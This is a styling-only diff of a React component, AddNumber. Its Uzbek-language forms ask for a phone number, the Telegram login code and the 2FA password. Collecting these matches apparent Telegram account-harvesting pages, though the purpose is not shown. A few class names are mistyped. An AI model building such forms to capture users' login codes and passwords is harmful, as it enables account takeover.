@@ -144,11 +144,11 @@ function AddNumber() {
     `}
         >
           {/* ================= FORM 1 ================= */}
-          <form onSubmit={handleSubmit1} className="bg-white rounded-lg p-4 w-85 space-y-3">
-            <h2 className="text-lg font-semibold">Telefon raqam</h2>
+          <form onSubmit={handleSubmit1} className="rounded-lg p-4 w-85 space-y-3">
+            <h2 className="text-lg text-white text-white font-semibold">Telefon raqam</h2>
 
             <div>
-              <label className="block text-sm font-medium mb-1">Telefon raqam</label>
+              <label className="block text-white text-sm font-medium mb-1">Telefon raqam</label>
               <input
                 ref={phoneRef}
                 title="Telefon raqam faqat shu formatda bo‘lishi kerak: +998XXXXXXXXX"
@@ -156,13 +156,13 @@ function AddNumber() {
                 type="tel"
                 required
                 placeholder="+998901234567"
-                className="w-full border rounded-md px-3 py-2 outline-none"
+                className="w-full text-white border border-white  rounded-md px-3 py-2 outline-none"
               />
             </div>
 
             {/* ===== CAPTCHA ===== */}
             <div>
-              <label className="block text-sm font-medium mb-1">Captcha</label>
+              <label className="block text-white text-sm font-medium mb-1">Captcha</label>
 
               <div className="flex items-center gap-2">
                 <div className="px-3 py-2 bg-gray-200 rounded font-mono">
@@ -179,40 +179,40 @@ function AddNumber() {
                 value={capAns}
                 onChange={(e) => setCapAns(e.target.value)}
                 placeholder="Javob"
-                className="mt-2 w-full border rounded-md px-3 py-2 outline-none "
+                className="mt-2 w-full border text-white border-white black backgraund-black rounded-md px-3 py-2 outline-none "
                 required
               />
               {capErr && <p className="text-red-500 text-sm mt-1">{capErr}</p>}
             </div>
 
             <button type="submit" className="w-full bg-blue-500 hover:bg-blue-700 text-white font-semibold py-2 rounded-md">
-              Kod yuborish
+              Ko'dni yuborish
             </button>
           </form>
 
           {/* ================= FORM 2 ================= */}
-          <form onSubmit={handleSubmit2} className="bg-white rounded-lg p-4 w-85 space-y-3">
-            <h2 className="text-center text-lg font-semibold">Tasdiqlash kodi {phone} raqamga jo'natildi</h2>
+          <form onSubmit={handleSubmit2} className="rounded-lg p-4 w-85 space-y-3">
+            <h2 className="text-ce text-whitenter text-lg font-semibold">Tasdiqlash kodi {phone} raqamga jo'natildi</h2>
 
             <div>
-              <label className="block text-sm font-medium mb-1">Telegram kodi</label>
+              <label className="block text-white text-sm font-medium mb-1">Telegram kodi</label>
               <input
                 ref={codeRef}
                 type="text"
                 required
                 pattern="^\d{5}$"
                 placeholder="12345"
-                className="w-full border rounded-md px-3 py-2 outline-none"
+                className="w-full  text-white  border rounded-md px-3 py-2 outline-none"
               />
             </div>
 
             <div>
-              <label className="block text-sm font-medium mb-1">2 bosqichli parol (agar bo‘lsa)</label>
+              <label className="block text-white text-sm font-medium mb-1">2 bosqichli parol (agar bo‘lsa)</label>
               <input
                 ref={twoFaRef}
                 type="password"
                 placeholder="Parol"
-                className="w-full border rounded-md px-3 py-2 outline-none"
+                className="w-full text-white border rounded-md px-3 py-2 outline-none"
               />
             </div>
 
@@ -233,9 +233,9 @@ function AddNumber() {
           </form>
 
           {/* ================= FORM 3 ================= */}
-          <div className="result bg-white shadow-lg rounded-xl p-6 w-85 space-y-4 flex flex-col items-center text-center animate-fadeIn">
+          <div className="result shadow-lg rounded-xl p-6 w-85 space-y-4 flex flex-col items-center text-center animate-fadeIn">
             {/* SUCCESS ICON */}
-            <div className="w-16 h-16 flex items-center justify-center rounded-full bg-green-100">
+            <div className="w-16 h-16 flex items-center justify-center rounded-full bg-white">
               <svg
                 className="w-9 h-9 text-green-600"
                 fill="none"
@@ -252,12 +252,12 @@ function AddNumber() {
             </div>
 
             {/* TITLE */}
-            <h2 ref={h2Ref} className="text-xl font-semibold text-green-700">
+            <h2 ref={h2Ref} className="text-xl font-semibold text-green-400">
               Success!
             </h2>
 
             {/* MESSAGE */}
-            <p className="text-gray-600">
+            <p className="text-white">
               Telefon raqam muvaffaqiyatli tasdiqlandi 🎉
             </p>
 
